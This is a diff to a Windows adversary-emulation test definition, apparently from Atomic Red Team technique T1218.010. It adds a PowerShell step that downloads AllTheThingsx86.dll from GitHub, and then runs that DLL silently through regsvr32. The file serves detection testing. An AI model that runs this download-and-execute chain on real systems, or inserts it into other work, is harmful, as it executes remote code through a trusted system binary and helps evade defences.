@@ -23,6 +23,11 @@ requirements:
     platforms:
         - os: windows
 steps:
+    - name: AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})
+      inline: |
+        if (Test-Path "#{dll_name}") {exit 0} else {{New-Item -Type Directory (split-path "#{dll_name}") -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll" -OutFile "#{dll_name}"}}
+      executor: powershell
     - name: regsvr32-silent-dll-install-call-dllregisterserver
       inline: |
         {{.Args.regsvr32path}}\{{.Args.regsvr32name}} /s /i "{{.Args.dll_name}}"
